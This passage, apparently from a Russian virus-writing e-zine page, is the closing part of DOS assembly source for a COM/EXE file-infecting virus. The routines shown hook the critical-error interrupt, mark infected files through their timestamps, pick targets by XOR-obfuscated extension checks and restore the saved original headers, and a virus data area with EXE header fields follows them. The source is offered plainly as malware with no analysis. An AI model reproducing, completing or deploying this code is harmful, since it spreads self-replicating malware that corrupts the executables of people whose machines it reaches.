call intr21<br>
ret<br>
<br>
Set_Old_Seek endp<br>
<br>
;<br>
<br>
Set_Seek_to_Old_Header proc near<br>
<br>
mov dx,cs:word ptr data_42<br>
mov cx,cs:word ptr data_43<br>
add dx,offset CopyHead-offset Start_Virus<br>
adc cx,0<br>
mov ax,4200h<br>
call intr21<br>
ret<br>
<br>
Set_Seek_to_Old_Header endp<br>
<br>
; Функция установки обработчика
критических ошибок.<br>
<br>
Set_Vector_24 proc near<br>
<br>
push ds<br>
push bx<br>
push dx<br>
mov ax,3524h<br>
call intr21<br>
mov cs:word ptr vector24,bx<br>
mov cs:word ptr vector24+2,es<br>
push cs<br>
pop ds<br>
mov ax,2524h<br>
mov dx,offset Intr24<br>
call intr21<br>
pop dx<br>
pop bx<br>
pop ds<br>
ret<br>
<br>
Set_Vector_24 endp<br>
<br>
; Функция восстановления вектора
обработчика критических ошибок.<br>
<br>
Restore_Vector_24 proc near<br>
<br>
push cs:word ptr vector24+2<br>
pop ds<br>
mov dx,word ptr vector24<br>
mov ax,2524h<br>
call intr21<br>
ret<br>
<br>
Restore_Vector_24 endp<br>
<br>
; Обработчик критических ошибок (
24-го - прерывания.)<br>
<br>
Intr24 proc far<br>
<br>
mov al,3 ; При возникновении ошибки ,
снять запрос с обработки.<br>
iret<br>
<br>
Intr24 endp<br>
<br>
; Процедура тестирования строки (
сравнение ).<br>
<br>
TestName proc near<br>
<br>
clc<br>
<br>
Next_Char:<br>
<br>
mov al,ds:[di]<br>
and al,223<br>
mov ah,cs:[si]<br>
xor ah,50<br>
cmp al,ah<br>
jne BadName<br>
inc di<br>
inc si<br>
loop Next_Char<br>
ret<br>
<br>
BadName:<br>
<br>
stc<br>
ret<br>
<br>
TestName endp<br>
<br>
; Функция проверки файла на
зараженность вирусом.<br>
<br>
Test_File_on_Virus proc near<br>
<br>
clc<br>
push ax<br>
push cx<br>
push dx<br>
mov ax,05700h<br>
call intr21<br>
and cx,00011111b<br>
cmp cx,00011111b<br>
pop dx<br>
pop cx<br>
pop ax<br>
jne exit_test_on_virus<br>
ret<br>
<br>
exit_test_on_virus:<br>
<br>
stc<br>
ret<br>
<br>
Test_File_on_Virus endp<br>
<br>
; Функция пpовеpки имени файла на
pасшиpение<br>
; Выделяет COM и EXE.<br>
<br>
Test_Name_Com&amp;Exe proc near<br>
<br>
clc<br>
<br>
; Проверка имени файла.<br>
; Поиск конца строки имени файла.<br>
<br>
mov cx,128<br>
mov al,0<br>
mov di,dx<br>
z1: cmp al,ds:[di]<br>
je z2<br>
inc di<br>
loop z1<br>
<br>
; Проверка на кол-во символов в
расширении файла.<br>
<br>
z2: sub di,4<br>
mov al,'.'<br>
cmp al,ds:[di]<br>
je z3<br>
stc<br>
ret<br>
<br>
z3: mov cx,3<br>
inc di<br>
mov si,offset Extension2<br>
push di<br>
call TestName<br>
pop di<br>
jc z4<br>
ret<br>
<br>
z4: mov cx,3<br>
mov si,offset Extension1<br>
call TestName<br>
<br>
z5:<br>
ret<br>
<br>
Test_Name_Com&amp;Exe endp<br>
<br>
; Процедура эффекта.<br>
<br>
Effect proc near<br>
<br>
ret<br>
<br>
Effect endp<br>
<br>
<br>
<br>
<br>
; ОБЛАСТЬ ДАННЫХ ВИРУСА.<br>
<br>
dermo dw ?<br>
dermo1 dw ?<br>
dermo2 dw ?<br>
attr_b dw ? ; Атрибуты файла.<br>
time_t dw ? ; Время последней
модификации файла.<br>
date_d dw ? ; Дата последней модификации
файла.<br>
<br>
tri dw ?<br>
PageL dw ? ; Кол-во байт в последней
странице.<br>
PageP dw ? ; Кол-во страниц в EXE - файле.<br>
ReloCnt dw ? ; Количество входов в Relocation
Table.<br>
HdrSize dw ? ; Размер заголовка в 16 -
байтных параграфах.<br>
MinMem dw ?<br>
MaxMem dw ?<br>
SStack dd ? ; Значение смещения SS:SP EXE -
файла.<br>
ChkSum dw ? ; Контрольная сумма EXE - файла.<br>
Header dd ? ; Значение стартового адреса
EXE - файла.<br>
<br>
CopyHead dw 020CDh<br>
OldPageS dd ?<br>
dd ?<br>
dd ?<br>
OldStack dd ?<br>
dw ?<br>
Head1 dw ?<br>
Head2 dw ?<br>
<br>
<br>
Extension1 db 'C' XOR 50,'O' XOR 50,'M' XOR 50<br>
Extension2 db 'E' XOR 50,'X' XOR 50,'E' XOR 50<br>
<br>
vector24 dd ? ; Старое значение вектора
24-го прерывания.<br>
function dw ? ; Код функции DOS.<br>
EXElen dd 0 ; Длина EXE - файла.<br>
<br>
<br>
FlagF db 0 ; Флаг типа файла ( COM - 0, EXE - 1 )<br>
FlagC db 0 ; Флаг для захвата File1 и Hendler<br>
Anti dd ? ; Внутренний буфер.<br>
dd ?<br>
Hendler dw ? ; Хендлер созданного файла.<br>
File1 dd ? ; Имя созданного файла.<br>
<br>
strin1 db 'K' XOR 75,'E' XOR 75,'L' XOR 75,'A' XOR 75,'-' XOR 75<br>
db '1' XOR 75,'6' XOR 75,'-' XOR 75,'C' XOR 75, 0 XOR 75<br>
string1 label word<br>
<br>
<br>
ident dd 0<br>
data_40 dw ?<br>
data_41 dw ?<br>
data_42 dw ?<br>
data_43 dw ?<br>
Count_Byte dw ?<br>
data_45 dw ?<br>
data_46 dw ?<br>
data_47 dw ?<br>
data_48 dw ?<br>
<br>
<br>
string db '~~~~'<br>
<br>
konec label word<br>
<br>
end Start_Virus</strong></font></p>

<p align="center"><a href="../TNO#2_start.htm"><img
src="../images/14ic3.gif" border="0" width="60" height="65"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../images/coollogo_com_7565375.jpg" border="0" width="206"
height="53"></a></p>
</body>
</html>
